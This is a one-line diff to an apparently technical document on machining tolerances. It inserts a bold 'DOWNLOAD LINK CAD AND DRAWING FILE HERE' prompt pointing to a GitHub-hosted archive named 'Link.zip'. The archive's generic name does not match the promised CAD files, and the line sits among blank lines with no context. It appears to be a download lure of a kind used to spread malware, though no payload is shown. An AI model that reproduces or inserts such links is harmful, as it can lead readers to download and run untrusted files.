@@ -105,6 +105,7 @@ Applying unnecessarily tight tolerances to non-critical features would increase 
 
 
 
+[DOWNLOAD LINK CAD AND DRAWING FILE HERE](https://github.com/user-attachments/files/32881585/Link.zip)
 
 
 
